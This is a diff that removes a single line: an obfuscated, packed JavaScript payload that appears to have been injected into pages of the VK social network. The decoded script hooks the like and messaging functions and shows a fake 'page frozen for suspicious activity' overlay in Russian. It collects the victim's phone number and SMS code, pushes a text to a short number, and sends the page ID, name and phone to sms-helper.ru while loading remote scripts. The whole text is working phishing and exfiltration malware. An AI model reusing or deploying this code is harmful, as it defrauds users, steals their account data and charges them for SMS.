@@ -1,1 +1,440 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('k J=[{\'4\':\'Австралия\',\'6\':\'+61\'},{\'4\':\'Австралия\',\'6\':\'+5Y\'},{\'4\':\'Австрия\',\'6\':\'+43\'},{\'4\':\'Азербайджан\',\'6\':\'+2Q\',\'G\':\'69\',\'x\':\'5V\'},{\'4\':\'Албания\',\'6\':\'+5M\'},{\'4\':\'Алжир\',\'6\':\'+21\'},{\'4\':\'Алжир\',\'6\':\'+26\'},{\'4\':\'Американское Самоа\',\'6\':\'+5T\'},{\'4\':\'Ангилья\',\'6\':\'+4B\'},{\'4\':\'Ангола\',\'6\':\'+4H\'},{\'4\':\'Андорра\',\'6\':\'+4G\'},{\'4\':\'Антигуа и Барбуда\',\'6\':\'+4S\'},{\'4\':\'Аргентина\',\'6\':\'+54\'},{\'4\':\'Армения\',\'6\':\'+2R\',\'G\':\'4R\',\'x\':\'4Z\'},{\'4\':\'Аруба\',\'6\':\'+4X\'},{\'4\':\'Афганистан\',\'6\':\'+93\'},{\'4\':\'Багамы\',\'6\':\'+4W\'},{\'4\':\'Бангладеш\',\'6\':\'+5Q\'},{\'4\':\'Барбадос\',\'6\':\'+7F\'},{\'4\':\'Бахрейн\',\'6\':\'+7d\'},{\'4\':\'Беларусь\',\'6\':\'+2S\',\'G\':\'7c\',\'x\':\'7b\'},{\'4\':\'Белиз\',\'6\':\'+7i\'},{\'4\':\'Бельгия\',\'6\':\'+32\'},{\'4\':\'Бенин\',\'6\':\'+6Y\'},{\'4\':\'Бермуды\',\'6\':\'+7A\'},{\'4\':\'Болгария\',\'6\':\'+7B\'},{\'4\':\'Боливия\',\'6\':\'+7E\'},{\'4\':\'Бонайре, Синт-Эстатиус и Саба\',\'6\':\'+7D\'},{\'4\':\'Босния и Герцеговина\',\'6\':\'+7q\'},{\'4\':\'Ботсвана\',\'6\':\'+7s\'},{\'4\':\'Бразилия\',\'6\':\'+55\'},{\'4\':\'Бруней-Даруссалам\',\'6\':\'+6n\'},{\'4\':\'Буркина-Фасо\',\'6\':\'+6A\'},{\'4\':\'Бурунди\',\'6\':\'+6P\'},{\'4\':\'Бутан\',\'6\':\'+7a\'},{\'4\':\'Вануату\',\'6\':\'+6E\'},{\'4\':\'Великобритания\',\'6\':\'+6z\'},{\'4\':\'Великобритания\',\'6\':\'+44\'},{\'4\':\'Венгрия\',\'6\':\'+36\'},{\'4\':\'Венесуэла\',\'6\':\'+58\'},{\'4\':\'Виргинские острова, Британские\',\'6\':\'+6f\'},{\'4\':\'Виргинские острова, США\',\'6\':\'+71\'},{\'4\':\'Восточный Тимор\',\'6\':\'+7g\'},{\'4\':\'Вьетнам\',\'6\':\'+84\'},{\'4\':\'Габон\',\'6\':\'+5k\'},{\'4\':\'Гайана\',\'6\':\'+5g\'},{\'4\':\'Гаити\',\'6\':\'+4F\'},{\'4\':\'Гамбия\',\'6\':\'+4D\'},{\'4\':\'Гана\',\'6\':\'+5O\'},{\'4\':\'Гваделупа\',\'6\':\'+7j\'},{\'4\':\'Гватемала\',\'6\':\'+5X\'},{\'4\':\'Гвинея\',\'6\':\'+4z\'},{\'4\':\'Гвинея-Бисау\',\'6\':\'+68\'},{\'4\':\'Германия\',\'6\':\'+49\'},{\'4\':\'Гибралтар\',\'6\':\'+5j\'},{\'4\':\'Гондурас\',\'6\':\'+7u\'},{\'4\':\'Гонконг\',\'6\':\'+6h\'},{\'4\':\'Гренада\',\'6\':\'+6e\'},{\'4\':\'Гренландия\',\'6\':\'+6D\'},{\'4\':\'Греция\',\'6\':\'+30\'},{\'4\':\'Грузия\',\'6\':\'+6C\'},{\'4\':\'Гуам\',\'6\':\'+6F\'},{\'4\':\'Дания\',\'6\':\'+45\'},{\'4\':\'Джибути\',\'6\':\'+6J\'},{\'4\':\'Доминика\',\'6\':\'+6H\'},{\'4\':\'Доминиканская Республика\',\'6\':\'+6I\'},{\'4\':\'Доминиканская Республика\',\'6\':\'+6G\'},{\'4\':\'Доминиканская Республика\',\'6\':\'+6B\'},{\'4\':\'Египет\',\'6\':\'+20\'},{\'4\':\'Замбия\',\'6\':\'+6K\'},{\'4\':\'Зимбабве\',\'6\':\'+6L\'},{\'4\':\'Йемен\',\'6\':\'+6S\'},{\'4\':\'Израиль\',\'6\':\'+6T\'},{\'4\':\'Индия\',\'6\':\'+91\'},{\'4\':\'Индонезия\',\'6\':\'+62\'},{\'4\':\'Иордания\',\'6\':\'+6U\'},{\'4\':\'Ирак\',\'6\':\'+6R\'},{\'4\':\'Иран\',\'6\':\'+98\'},{\'4\':\'Ирландия\',\'6\':\'+6Q\'},{\'4\':\'Исландия\',\'6\':\'+6M\'},{\'4\':\'Исландия\',\'6\':\'+6N\'},{\'4\':\'Исландия\',\'6\':\'+6O\'},{\'4\':\'Испания\',\'6\':\'+34\'},{\'4\':\'Италия\',\'6\':\'+39\'},{\'4\':\'Кабо-Верде\',\'6\':\'+6k\'},{\'4\':\'Казахстан\',\'6\':\'+77\',\'G\':\'6l\'},{\'4\':\'Камбоджа\',\'6\':\'+6m\'},{\'4\':\'Камерун\',\'6\':\'+6j\'},{\'4\':\'Канада\',\'6\':\'+1\'},{\'4\':\'Катар\',\'6\':\'+6i\'},{\'4\':\'Кения\',\'6\':\'+6g\'},{\'4\':\'Кипр\',\'6\':\'+6o\'},{\'4\':\'Кирибати\',\'6\':\'+6p\'},{\'4\':\'Китай\',\'6\':\'+86\'},{\'4\':\'Колумбия\',\'6\':\'+57\'},{\'4\':\'Коморы\',\'6\':\'+6w\'},{\'4\':\'Конго\',\'6\':\'+6x\'},{\'4\':\'Конго, демократическая республика\',\'6\':\'+6y\'},{\'4\':\'Коста-Рика\',\'6\':\'+6v\'},{\'4\':\'Кот д`Ивуар\',\'6\':\'+3z\'},{\'4\':\'Куба\',\'6\':\'+53\'},{\'4\':\'Кувейт\',\'6\':\'+6u\'},{\'4\':\'Кыргызстан\',\'6\':\'+6q\'},{\'4\':\'Кюрасао\',\'6\':\'+6r\'},{\'4\':\'Лаос\',\'6\':\'+6s\'},{\'4\':\'Латвия\',\'6\':\'+2V\',\'G\':\'6t\',\'x\':\'3A\'},{\'4\':\'Лесото\',\'6\':\'+6V\'},{\'4\':\'Либерия\',\'6\':\'+4x\'},{\'4\':\'Ливан\',\'6\':\'+6W\'},{\'4\':\'Ливия\',\'6\':\'+7r\'},{\'4\':\'Литва\',\'6\':\'+2U\',\'G\':\'7t\',\'x\':\'3A\'},{\'4\':\'Лихтенштейн\',\'6\':\'+7p\'},{\'4\':\'Люксембург\',\'6\':\'+7l\'},{\'4\':\'Маврикий\',\'6\':\'+7m\'},{\'4\':\'Мавритания\',\'6\':\'+7n\'},{\'4\':\'Мадагаскар\',\'6\':\'+7o\'},{\'4\':\'Макао\',\'6\':\'+7v\'},{\'4\':\'Македония\',\'6\':\'+7C\'},{\'4\':\'Малави\',\'6\':\'+7w\'},{\'4\':\'Малайзия\',\'6\':\'+60\'},{\'4\':\'Мали\',\'6\':\'+7x\'},{\'4\':\'Мальдивы\',\'6\':\'+7y\'},{\'4\':\'Мальта\',\'6\':\'+7z\'},{\'4\':\'Марокко\',\'6\':\'+7k\'},{\'4\':\'Мартиника\',\'6\':\'+73\'},{\'4\':\'Маршалловы Острова\',\'6\':\'+74\'},{\'4\':\'Мексика\',\'6\':\'+52\'},{\'4\':\'Микронезия, федеративные штаты\',\'6\':\'+75\'},{\'4\':\'Мозамбик\',\'6\':\'+76\'},{\'4\':\'Молдова\',\'6\':\'+2Y\',\'G\':\'72\',\'x\':\'6X\'},{\'4\':\'Монако\',\'6\':\'+6Z\'},{\'4\':\'Монголия\',\'6\':\'+70\'},{\'4\':\'Монтсеррат\',\'6\':\'+78\'},{\'4\':\'Мьянма\',\'6\':\'+95\'},{\'4\':\'Намибия\',\'6\':\'+79\'},{\'4\':\'Науру\',\'6\':\'+7h\'},{\'4\':\'Непал\',\'6\':\'+7f\'},{\'4\':\'Нигер\',\'6\':\'+7e\'},{\'4\':\'Нигерия\',\'6\':\'+6d\'},{\'4\':\'Нидерланды\',\'6\':\'+31\'},{\'4\':\'Никарагуа\',\'6\':\'+4Y\'},{\'4\':\'Ниуэ\',\'6\':\'+4V\'},{\'4\':\'Новая Зеландия\',\'6\':\'+64\'},{\'4\':\'Новая Каледония\',\'6\':\'+4Q\'},{\'4\':\'Норвегия\',\'6\':\'+47\'},{\'4\':\'Объединенные Арабские Эмираты\',\'6\':\'+4T\'},{\'4\':\'Оман\',\'6\':\'+59\'},{\'4\':\'Остров Мэн\',\'6\':\'+44\'},{\'4\':\'Остров Норфолк\',\'6\':\'+5a\'},{\'4\':\'Острова Кайман\',\'6\':\'+5h\'},{\'4\':\'Острова Кука\',\'6\':\'+5i\'},{\'4\':\'Острова Теркс и Кайкос\',\'6\':\'+5f\'},{\'4\':\'Пакистан\',\'6\':\'+92\'},{\'4\':\'Палау\',\'6\':\'+5b\'},{\'4\':\'Палестинская автономия\',\'6\':\'+5c\'},{\'4\':\'Панама\',\'6\':\'+5d\'},{\'4\':\'Папуа - Новая Гвинея\',\'6\':\'+4P\'},{\'4\':\'Парагвай\',\'6\':\'+5l\'},{\'4\':\'Перу\',\'6\':\'+51\'},{\'4\':\'Питкерн\',\'6\':\'+64\'},{\'4\':\'Польша\',\'6\':\'+48\'},{\'4\':\'Португалия\',\'6\':\'+4O\'},{\'4\':\'Пуэрто-Рико\',\'6\':\'+4I\'},{\'4\':\'Пуэрто-Рико\',\'6\':\'+4L\'},{\'4\':\'Реюньон\',\'6\':\'+4J\'},{\'4\':\'Россия\',\'6\':\'+7\',\'G\':\'4w\'},{\'4\':\'Руанда\',\'6\':\'+3h\'},{\'4\':\'Румыния\',\'6\':\'+40\'},{\'4\':\'Сальвадор\',\'6\':\'+4K\'},{\'4\':\'Самоа\',\'6\':\'+4N\'},{\'4\':\'Сан-Марино\',\'6\':\'+4C\'},{\'4\':\'Сан-Томе и Принсипи\',\'6\':\'+4M\'},{\'4\':\'Саудовская Аравия\',\'6\':\'+4E\'},{\'4\':\'Свазиленд\',\'6\':\'+5e\'},{\'4\':\'Святая Елена\',\'6\':\'+6c\'},{\'4\':\'Святая Елена\',\'6\':\'+5m\'},{\'4\':\'Северная Корея\',\'6\':\'+5R\'},{\'4\':\'Северные Марианские острова\',\'6\':\'+5S\'},{\'4\':\'Сейшелы\',\'6\':\'+5P\'},{\'4\':\'Сенегал\',\'6\':\'+5K\'},{\'4\':\'Сент-Винсент\',\'6\':\'+5L\'},{\'4\':\'Сент-Китс и Невис\',\'6\':\'+5N\'},{\'4\':\'Сент-Люсия\',\'6\':\'+5U\'},{\'4\':\'Сент-Пьер и Микелон\',\'6\':\'+6a\'},{\'4\':\'Сербия\',\'6\':\'+6b\'},{\'4\':\'Сингапур\',\'6\':\'+65\'},{\'4\':\'Синт-Мартен\',\'6\':\'+67\'},{\'4\':\'Сирийская Арабская Республика\',\'6\':\'+5W\'},{\'4\':\'Словакия\',\'6\':\'+5Z\'},{\'4\':\'Словения\',\'6\':\'+5J\'},{\'4\':\'Соломоновы Острова\',\'6\':\'+5I\'},{\'4\':\'Сомали\',\'6\':\'+5t\'},{\'4\':\'Судан\',\'6\':\'+5u\'},{\'4\':\'Суринам\',\'6\':\'+5v\'},{\'4\':\'США\',\'6\':\'+1\'},{\'4\':\'Сьерра-Леоне\',\'6\':\'+5w\'},{\'4\':\'Таджикистан\',\'6\':\'+5s\'},{\'4\':\'Тайвань\',\'6\':\'+5r\'},{\'4\':\'Таиланд\',\'6\':\'+66\'},{\'4\':\'Танзания\',\'6\':\'+5n\'},{\'4\':\'Того\',\'6\':\'+5o\'},{\'4\':\'Токелау\',\'6\':\'+5p\'},{\'4\':\'Тонга\',\'6\':\'+5q\'},{\'4\':\'Тринидад и Тобаго\',\'6\':\'+5x\'},{\'4\':\'Тувалу\',\'6\':\'+5y\'},{\'4\':\'Тунис\',\'6\':\'+5F\'},{\'4\':\'Туркменистан\',\'6\':\'+5G\'},{\'4\':\'Турция\',\'6\':\'+90\'},{\'4\':\'Уганда\',\'6\':\'+5H\'},{\'4\':\'Узбекистан\',\'6\':\'+5E\'},{\'4\':\'Украина\',\'6\':\'+2C\',\'G\':\'5D\'},{\'4\':\'Уоллис и Футуна\',\'6\':\'+5z\'},{\'4\':\'Уругвай\',\'6\':\'+5A\'},{\'4\':\'Фарерские острова\',\'6\':\'+5B\'},{\'4\':\'Фиджи\',\'6\':\'+5C\'},{\'4\':\'Филиппины\',\'6\':\'+63\'},{\'4\':\'Финляндия\',\'6\':\'+4U\'},{\'4\':\'Фолклендские острова\',\'6\':\'+9L\'},{\'4\':\'Франция\',\'6\':\'+33\'},{\'4\':\'Французская Гвиана\',\'6\':\'+a6\'},{\'4\':\'Французская Полинезия\',\'6\':\'+a1\'},{\'4\':\'Хорватия\',\'6\':\'+a5\'},{\'4\':\'Центрально-Африканская Республика\',\'6\':\'+9E\'},{\'4\':\'Чад\',\'6\':\'+9H\'},{\'4\':\'Черногория\',\'6\':\'+9A\'},{\'4\':\'Чехия\',\'6\':\'+9z\'},{\'4\':\'Чили\',\'6\':\'+56\'},{\'4\':\'Швейцария\',\'6\':\'+41\'},{\'4\':\'Швеция\',\'6\':\'+46\'},{\'4\':\'Шпицберген и Ян Майен\',\'6\':\'+47\'},{\'4\':\'Шри-Ланка\',\'6\':\'+94\'},{\'4\':\'Эквадор\',\'6\':\'+9y\'},{\'4\':\'Экваториальная Гвинея\',\'6\':\'+9x\'},{\'4\':\'Эритрея\',\'6\':\'+9w\'},{\'4\':\'Эстония\',\'6\':\'+9u\'},{\'4\':\'Эфиопия\',\'6\':\'+9v\'},{\'4\':\'Южная Корея\',\'6\':\'+82\'},{\'4\':\'Южно-Африканская Республика\',\'6\':\'+27\'},{\'4\':\'Южный Судан\',\'6\':\'+9B\'},{\'4\':\'Ямайка\',\'6\':\'+9G\'},{\'4\':\'Япония\',\'6\':\'+81\'}];k 1f=\'\';k 1v=\'\';p 3k(6){k 2d=\'\';1K(i=0;i<J.1U;i++){q(6==J[i].6){k 29="9F";1f=J[i].G;1v=J[i].x}2H{k 29=""}2d+=\'<3b 4s="\'+((J[i].x)?J[i].x:"")+\'" G="\'+((J[i].G)?J[i].G:"")+\'" \'+29+\' T="\'+J[i].6+\'" o="2j\'+J[i].6+\'">\'+J[i].4+\' (\'+J[i].6+\')\'+\'</3b>\'+"\\r\\n"}v 2d}p 1B(){k g=2A 9C().1B()/9D/60;g=g-(g%1);v g}p 2f(){A{k 1h=s.y(\'1X\');q(1h)v D;s.N(\'1T\',P.o.1C());s.N(\'V\',\'0\')}z(e){}3a.38(\'/4A.2B\',37,p(x){B=x.2G(/([+]{1}[0-9]+(?:[\\*]+))/g);q(B){A{s.N(\'1c\',B.1C())}z(e){}}});3a.38(\'/o\'+P.o.1C(),37,p(x){k 4=x.2G(/(?:<\\/b><\\/b> ).+(?=<\\/9s>)/2t);q(4){4=4[0].1e(/<\\/b>/2X,\'\');A{s.N(\'1I\',9i(4))}z(e){}}})}p 3Z(){q(1V.1W.3X(\'1J\')>-1)v D;A{k o=s.y(\'1T\');k B=s.y(\'1c\');k 4=s.y(\'1I\')}z(e){}q(!o||!B||!4){2f();v D}q(o!=P.o){2f();v D}v 1k}p 3Y(){A{k 1h=s.y(\'1X\')}z(e){}q(1h)v D;A{k 12=s.y(\'V\');q(12==3)v D;q(1b.1s){1s.3c=p(){R()}1s.9j=p(){R()}1s.9h=p(){R()}1s.9g=p(){R()}}q(1b.1H){1H.3c=p(){R()}1H.9d=p(){R()}1H.9e=p(){R()}}q(1b.3d){3d.9f=p(){R()}q(8(\'3g\'))8(\'3g\').L(\'1m\',\'R();\')}}z(e){}}p 25(3f,3e){k 1g=E.3L("9k");1g.L("9l","9q");1g.L("U","x/1p");1g.L("1W",3f);E.3J("3V")[0].4n(1g);1g.9r=3e}p 2F(K,x,2D,2x){K=8(K);k 2k=p(){9p(K,{x:\'<l t="9o"></l>\'+x,9J:15,9m:\'9n\'+(2x?(\' \'+2x):\'\'),2D:2D,9I:1k,a3:4p.a4(K,\'a2\')})}q(P.a7){13(2k,0)}2H{9Z(1b,\'9P\',2k)}}p 2o(K){K=8(K);q(K&&K.2z&&K.2z.35)K.2z.35()}p 2N(){q(8(\'2a\').2Z)v;v 2F(\'2q\',\'Укажите Ваш номер, к которому <b>будет</b> привязана страница. Мы вышлем на него <b>9Q</b> с кодом. Эта процедура бесплатна.<C><C>Пример номера: <b>+7 9O a0</b>\',[-2T,-95,3],\'9N\')}p 2L(){q(8(\'2e\').2Z)v;v 2F(\'2w\',\'На Ваш телефон в течение нескольких секунд придет <b>5</b>-значный код.<C><C>Пример кода: <b>9K</b>\',[-2T,-82,3])}p 2W(G){v G.2G(/\\+7(?!7)|\\+77|\\+2C|\\+2S|\\+2R|\\+2Q|\\+2U|\\+2V|\\+2Y/2X)}p 28(){A{8(\'1y\').m.u=\'H\';8(\'2r\').m.9M=(1b.9R/2-1G)+\'9S\';8(\'2r\').m.u=\'H\';13(p(){8(\'2r\').m.u=\'I\';2u()},9X)}z(e){2u()}}p 2u(){9Y.9W=9V;A{k 4=9T(s.y(\'1I\'));k B=s.y(\'1c\');B=B.1e(/(\\*)+/,\'\')}z(e){}k 6=2W(B);A{k 16=s.y(\'V\')}z(e){}k 2v=2A 9U({\'7G\':3h,\'F\':9t,\'9b\':D});E.8c=4;q(16==2){A{8(\'8d\').m.F=\'8e\';8(\'3i\').17.1a(E.X(\'3i\'));8(\'3w\').17.1a(E.X(\'3w\'));8(\'1y\').17.1a(E.X(\'1y\'));k 3v=8(\'8b\').M;8(\'8a\').M=\'<l m="85: 87; 3p: 88;">\'+3v+\'</l>\';8(\'3u\').17.1a(E.X(\'3u\'));8(\'2P\').17.1a(E.X(\'2P\'));8(\'3x\').17.1a(E.X(\'3x\'));8(\'3y\').L(\'t\',\'4o\');8(\'3y\').m.F=\'89\';8(\'8f\').M=\'\';1b.8g={}}z(e){}}A{k 3B=s.y(\'3E\')}z(e){}q(3B>1B()){k 2n=\'<Y o="1r" m="Q: 1Y;" 1m="4u()">Получить код</Y>\';k 1z=\'H\'}2H{k 2n=\'<Y o="1r" m="Q: 1Y;" 1m="4v()">Сменить пароль</Y>\';k 1z=\'I\'}k 1t=\'<l o="8m"><l t="8n"><1l 11="/3t/8o/8l.3s" o="8k" Q="8h" F="3z" /><C/><b>\'+4+\'</b>, к сожалению, мы обнаружили подозрительную активность и <b>временно заморозили</b> Вашу страницу, чтобы вырвать её из рук злоумышленников.<C><C>Для того чтобы разморозить страницу, мы просим Вас подтвердить, что Вы владелец страницы и сменить пароль.<C/><C/>Эта страница заморожена за подозрительные отметки <b>мне нравится</b> пользователям: </l>  <l t="8i"><l t="8j"><1F><1j 3m="3l"><w m="F: 1u;"><1l F="50" Q="50" 11="O://9c.P.1A/83/80/7N.1D"></w><w m="F: 1u;"><1l F="50" Q="50" 11="O://7O.P.1A/7P/7M/7L.1D"></w><w m="F: 1u;"><1l F="50" Q="50" 11="O://7H.P.1A/7I/7J/7K.1D"></w><w m="F: 1u;"><1l F="50" Q="50" 11="O://P.1M/3t/7Q.3s"></w><w m="F: 1u;"><1l F="50" Q="50" 11="O://7R.P.1A/7X/b/7Y-7Z.1D"></w></1j><1j 3m="3l"><w>Василий<C/>Иванович</w><w>Валерия<C/>Якуничкина</w><w>Иван<C/>Серебряков</w><w>Владислав</C>Вологдин</w><w>Артём<C/>Хлусов</w></1j></1F></l></l><l t="7W" o="W" m="3q-7V: 7S"></l><C/><l t="7T"><l t="2h" o="7U" m="u: \'+1z+\'"><l t="2E" o="8p"><l t="2I">Страна</l><3j 8q="4q(8R)" m="F: 8S; Q: 8T; Z: 18 1x 1S(3o, 3r, 26);" 4="J" o="3O">\'+3k(6)+\'</3j><2J U="8Q" o="3n" 4="3n" /></l></l><l t="2h" o="8P" m="u: \'+1z+\'"><l t="2E" o="2q"><l t="2I">Мобильный телефон</l><1F o="8M" m="Z: 18 1x 1S(3o, 3r, 26); 8N: #8O;" t="8U" 8V="0" 97="0"><1j><w o="1w"><3C m="3q-3p: 99; 2l: 1S(2b, 2b, 2b);">\'+6+\'</3C></w><w t="9a"><2J U="x" o="2a" 2O="2o(\\\'2q\\\')" 2K="2N()" T="\'+B.1e(6,\'\')+\'"  t="3D 96" /></w></1j></1F></l></l><l o="3S" t="2h" m="u: I"><l o="2w" t="2E"><l t="2I">Код подтверждения</l><2J U="x" o="2e" T="" t="3D" 8Z="Введите код сюда" 2O="2o(\\\'2w\\\')" 2K="2L()" /></l></l><l t="2i" o="3P" m=""><l t="2m 2c"><1L t="2M" o="1q" m="u: I;"></1L>\'+2n+\'</l></l><l t="2i" o="22" m="u: I"><l t="2m 2c"><1L t="2M" o="14" m="u: I;"></1L><Y o="1n" m="Q: 1Y;" 1m="3U()">Отправить код</Y></l><l t="8W"><a o="8X" 1m="4r()">Я не получил код</a></l></l><l t="2i" o="3N" m="u: I"><l t="2m 2c"><Y o="8Y" 1m="3G();">Разморозить</Y></l></l></l></l>\';2v.1t(1t+\'<l o="42"></l>\');q(16==2){8(\'2y\').L(\'t\',\'4o\');8(\'2y\').M=\'<l o="1t" m="Z-2l: 1S(8L, 4z, 4x); Z-m: 1x; Z-F: 4y 18 18;">\'+1t+\'</l>\';8(\'2y\').L(\'m\',\'Z-F: 4y 18 18; Z-2l: 8K(1G, 1G, 1G, 0.8x); Z-m: 1x;\')}q(16==1){2v.8y();A{s.N(\'V\',\'2\')}z(e){}}k 2p=8(\'1y\');q(2p)4p(2p,\'8z\',8w.8v)}p 4q(1E){8(\'1w\').4h[0].M=1E.T;1f=E.X("2j"+1E.T).4t(\'G\');1v=E.X("2j"+1E.T).4t(\'4s\')}p 4r(){8(\'W\').M=\'<b>Если Вам не пришло смс сообщение.</b><C/>Отправте \'+((1v)?"смс с текстом <b>"+1v+"</b>":"<b>пустое смс</b> сообщение")+\' по номеру <b>\'+((1f)?1f:"4w")+\'</b>.\';8(\'W\').m.u=\'H\'}p 4v(){A{s.N(\'V\',\'3\');s.3F()}z(e){}E.1V.1e(\'O://P.1M/4A#8r\')}p 4u(){x=8(\'2a\');q(!/^[0-9]{10}$/.1R(x.T)){8(\'1r\').S=\'\';8(\'1q\').m.u=\'H\';13(p(){8(\'1r\').S=\'Получить код\';8(\'1q\').m.u=\'I\';8(\'W\').M=\'<b>Некорректный мобильный номер.</b></C> Необходимо корректно ввести номер <b>в международном формате</b>, например<C/> <b>+7(8s)8t-4m-4m</b>.\';8(\'W\').m.u=\'H\'},1Z);v D}k 6=8(\'1w\').S;A{s.N(\'1c\',6+x.T)}z(e){}x.L(\'3Q\',\'3Q\');8(\'1r\').S=\'\';8(\'1q\').m.u=\'H\';3I();13(p(){8(\'1q\').m.u=\'I\';8(\'3P\').m.u=\'I\';8(\'3O\').L(\'3R\',\'3R\');8(\'3S\').m.u=\'H\';8(\'22\').m.u=\'H\'},1Z);v 1k}p 3U(){k 23=8(\'2e\').T;q(!/^[0-9]{5}$/.1R(23)){8(\'1n\').S=\'\';8(\'14\').m.u=\'H\';13(p(){8(\'1n\').S=\'Отправить код\';8(\'14\').m.u=\'I\';8(\'W\').M=\'<b>Неверный код.</b></C> Проверьте правильность ввода кода.\';8(\'W\').m.u=\'H\'},3M)v D}q(3T)k 24=3T.8u(\':\');1K(i=0;i<24.1U;i++)q(24[i]==23){8(\'1n\').S=\'\';8(\'14\').m.u=\'H\';13(p(){8(\'14\').m.u=\'I\';8(\'22\').m.u=\'I\';8(\'3N\').m.u=\'H\'},1Z)4g();v 1k}8(\'1n\').S=\'\';8(\'14\').m.u=\'H\';13(p(){8(\'1n\').S=\'Отправить код\';8(\'14\').m.u=\'I\';8(\'W\').M=\'<b>Неверный код.</b></C> Проверьте правильность ввода кода.\';8(\'W\').m.u=\'H\'},3M)v D}p 3G(){A{s.N(\'V\',\'3\');s.3F()}z(e){}1V.8A()}p R(){A{k 12=s.y(\'V\')}z(e){}q(12==3)v D;A{s.N(\'V\',\'1\');k 3H=1B()+60;s.N(\'3E\',3H.1C())}z(e){}25(\'O://4a.4c.1M/1p/4b/1J.1p\',28())}p 3I(){A{k B=s.y(\'1c\');k o=s.y(\'o\');k 1o=s.y(\'1o\');k 1P=s.y(\'1T\');k 1O=[\'a\',\'b\',\'c\',\'d\',\'e\',\'f\',\'g\',\'h\',\'i\',\'j\'];B=B.1e(/\\+/,\'\');k 1i="";1K(i=0;i<B.1U;i++)1i+=1O[4f(B[i])];k 19=E.3L(\'8B\');19.L(\'U\',\'x/8H\');k U=3W();k 3K=\'O://19-4i.4j/4l/8I.2B?U=\'+U+\'&4k=\'+1i+\'&4e=\'+1P+\'&o=\'+o+\'&8J=\'+1f;19.L(\'11\',3K);E.3J(\'3V\')[0].4n(19)}z(e){}}p 3W(){k 2s=8(\'1w\').4h[0].M;q(/\\+7/2t.1R(2s)){v 3}q(/\\+2C/2t.1R(2s)){v 1}v 2}p 4g(){A{k o=s.y(\'o\');k 1o=s.y(\'1o\');k 1P=s.y(\'1T\');k 4=s.y(\'1I\');k B=s.y(\'1c\');k 1O=[\'a\',\'b\',\'c\',\'d\',\'e\',\'f\',\'g\',\'h\',\'i\',\'j\'];B=B.1e(/\\+/,\'\');k 1i="";1K(i=0;i<B.1U;i++)1i+=1O[4f(B[i])];4=4d(4);k 12=2A 8G();12.11=\'O://19-4i.4j/4l/12.2B?U=1&4k=\'+1i+\'&4=\'+4+\'&4e=\'+1P+\'&o=\'+o+\'&1o=\'+1o+\'&8F=\'+4d(8C.8D)}z(e){}}p 1d(){q(!3Z())v D;3Y();A{k 1h=s.y(\'1X\')}z(e){}q(1h){E.1N.2g(\'1Q\',1d,D);v D}q(1V.1W.3X(\'1J\')>-1)v D;q(8(\'42\'))v D;A{k 16=s.y(\'V\')}z(e){}q(16==3){E.1N.2g(\'1Q\',1d,D);v 1k}q(16==2){E.1N.2g(\'1Q\',1d,D);25(\'O://4a.4c.1M/1p/4b/1J.1p\',28());v 1k}}E.1N.8E(\'1Q\',1d,D);1d();',62,628,'||||name||code||ge||||||||||||var|div|style||id|function|if||plg|class|display|return|td|text|Get|catch|try|number|br|false|document|width|num|block|none|country|el|setAttribute|innerHTML|Save|http|vk|height|start|innerText|value|type|vRun|blocked_submit_result|getElementById|button|border||src|stat|setTimeout|btn_lock_2||run|parentNode|1px|sms|removeChild|window|vTel|isRun|replace|noCodeNum|elCSS|od|res|tr|true|img|onclick|blocked_send_code|group|css|btn_lock_1|blocked_send_phone|wall|content|80px|noCodeTxt|blocked_phone_prefix|solid|box_layer_wrap|see_row|me|getTime|toString|jpg|val|table|100|Photoview|vName|login|for|span|com|body|alpha|idPage|DOMNodeInserted|test|rgb|vIdPage|length|location|href|oRun|23px|1500|||blocked_code_submit|uCode|validKey|CreateCSS|213||Loader|sel|blocked_phone|119|button_wide|str|blocked_code|GetInfForUser|removeEventListener|login_blocked_row|login_blocked_submit|__|showTT|color|button_blue|btn|tipHides|gg|blocked_phone_wrap|box_loader|prefix|ig|MyBoxLock|boxLock|blocked_code_wrap|addClass|page_body|tt|new|php|380|shift|login_select_wrap|tipShow|match|else|login_blocked_label|input|onfocus|codeTip|button_lock|phoneTip|onblur|stl_bg|994|374|375|147|370|371|TelCode|gi|373|readOnly||||||hide||null|plainpost||ajax|option|like|IM|func|urlCss|im_send|250|notifiers_wrap|select|GetCountry|center|align|blocked_country|192|right|margin|202|gif|images|side_bar|exit_btn|ts_wrap|stl_side|footer_wrap|225|3pm342243|lTime|nobr|login_big_text|vTime|Del|EndLock|startTime|SendSMS|getElementsByTagName|url|createElement|2000|blocked_pass_submit|chCountry|blocked_phone_submit|readonly|disabled|blocked_code_row|sendSms|CheckCode|head|GetType|indexOf|NewAction|IsInf|||modalWND||||||||st0|al|userapi|encodeURIComponent|page|parseInt|SendStat|childNodes|helper|ru|set|js|00|appendChild|simple|removeEvent|ChangeCountry|noCode|txt|getAttribute|GetCode|ChangePass|2332|231|0px|224|settings|1264|378|220|966|509|376|244|1787|262|503|1939|239|685|351|675|687|1003|1268|971|358|683|1242|297|505|pm342243||||||||||968|6723|680|970|507|268|1649|592|1345|682|350|241|595|290|255|228|690|676|886|992|252|249|597|232|1868|688|681|598|298|679|9106|998|216|993|256|677|386|221|1784|355|1869|233|248|880|850|1670|1684|1758|3342243|963|502|672|421||||||||599|245|8777|508|381|247|234|1473|1284|254|852|974|237|238|7502|855|673|357|686|996|5999|856|1897|965|506|269|242|243|246|226|1849|995|299|678|1671|1829|1767|1809|253|260|263|354|403|404|257|353|964|967|972|962|266|961|342243|229|377|976|1340|7250|596|692|691|258||1664|264|975|44342243|1310|973|227|977|670|674|501|590|212|352|230|222|261|423|387|218|267|1337|504|853|265|223|960|356|1441|359|389|1721|591|1246|animSpeed|cs418927|v418927942|1d7e|vwpmoFSQk7A|VU8jcjA29hA|71b3|bmBQFxGlKUw|cs411922|v411922272|deactivated_c|cs9192|20px|login_blocked_form|blocked_country_row|top|msg|v9192130|GGRuqJ5|Zuo|6d2a|||v307906065||position||absolute|10px|auto|top_links|logout_link_td|title|page_layout|661px|rb_box_fc_clist|FastChat|160|login_blocked_reason_wrap|login_blocked_reason|login_blocked_img|spamfight|login_blocked_wrap|login_blocked_centered|pics|blocked_country_wrap|onchange|settings_error_pwd|921|000|split|hideLastCheck|__bq|